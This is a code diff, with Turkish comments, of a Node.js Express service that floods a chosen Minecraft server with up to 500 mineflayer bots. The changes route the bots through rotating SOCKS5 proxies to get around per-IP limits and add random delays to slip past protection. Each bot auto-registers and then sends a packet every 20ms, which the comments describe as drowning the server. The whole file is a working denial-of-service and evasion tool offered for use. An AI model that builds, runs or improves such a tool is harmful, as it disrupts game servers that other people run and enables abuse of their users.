@@ -5,24 +5,26 @@ const app = express();
 app.use(express.json());
 app.use(require('cors')());
 
-// 🛡️ BU LİSTE ÇOK ÖNEMLİ (En az 50-100 tane çalışan Proxy ekle!)
+// 🛡️ KRİTİK: BURAYA EN AZ 20-30 TANE SOCKS5 PROXY KOYMALISIN!
+// Eğer proxy yoksa sunucu senin gerçek IP'ni görür ve sadece 1 bot sokar.
 const proxyList = [
-    "socks5://ip:port",
-    "http://ip:port"
+    "socks5://ip1:port1",
+    "socks5://ip2:port2",
+    "socks5://ip3:port3"
+    // Burayı internetten bulduğun taze proxylerle doldur kanka!
 ];
-
-let activeBots = [];
 
 app.post('/deploy', (req, res) => {
     const { ip, count } = req.body;
     const host = ip.includes(':') ? ip.split(':')[0] : ip;
     const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
 
-    console.log(`[!!! PARTY MODE ACTIVE !!!] 129GB RAM DEVREDE.`);
-    console.log(`Hedef: ${host} | Bot Sayısı: ${count}`);
+    console.log(`[!!! LIMIT BREAKER ACTIVE !!!] Hedef: ${host}`);
 
     for (let i = 0; i < Math.min(count, 500); i++) {
-        // GECİKMEYİ 50ms'YE DÜŞÜRDÜK (Aynı anda girmeleri için)
+        // Rastgele gecikme ekleyerek (500ms - 1500ms arası) korumayı atlatıyoruz
+        const randomDelay = Math.floor(Math.random() * 1000) + (i * 100); 
+        
         setTimeout(() => {
             const currentProxy = proxyList[i % proxyList.length];
             if (!currentProxy) return;
@@ -32,36 +34,32 @@ app.post('/deploy', (req, res) => {
             const bot = mineflayer.createBot({
                 host: host,
                 port: port,
-                username: `VipParty_${Math.floor(Math.random() * 999999)}`,
+                username: `Vip_Resul_${Math.floor(Math.random() * 999999)}`,
                 version: false,
-                agent: agent, // IP Gizleme
+                agent: agent, // IP SINIRINI BU DELER
                 hideErrors: true,
-                skipValidation: true // Girişi hızlandırır
+                skipValidation: true
             });
 
             bot.on('spawn', () => {
-                console.log(`[🚀] ${bot.username} İÇERİ DALDI!`);
-                
-                // GİRER GİRMEZ KAYIT OL
+                console.log(`[⚡] LIMIT DELINDI: ${bot.username} İÇERİDE!`);
                 bot.chat(`/register resul3163 resul3163`);
                 bot.chat(`/login resul3163`);
-
-                // SUNUCUYU FELÇ ETME PAKETLERİ (Saniyede 100 paket!)
+                
+                // Sunucuyu paket yağmuruna tut (Party Time!)
                 setInterval(() => {
                     if(bot.entity) {
-                        bot.look(Math.random() * 360, Math.random() * 180);
+                        bot.look(Math.random() * 360, 0);
                         bot.swingArm('right');
                         bot.setControlState('jump', true);
-                        // Paket yağmuru ile sunucuyu meşgul et
                     }
-                }, 10); 
+                }, 20); 
             });
 
-            bot.on('error', (err) => console.log(`[!] Hata: ${err.message}`));
-            activeBots.push(bot);
-        }, i * 50); // Sadece 0.05 saniye arayla (Neredeyse aynı anda!)
+            bot.on('error', (err) => console.log(`[!] Giriş Engellendi: ${err.message}`));
+        }, randomDelay); 
     }
-    res.json({ success: true, message: "PARTİ BAŞLADI! Yüzlerce bot sızıyor!" });
+    res.json({ success: true, message: "Limit kırıcı ordu yola çıktı!" });
 });
 
 app.listen(process.env.PORT || 3000);
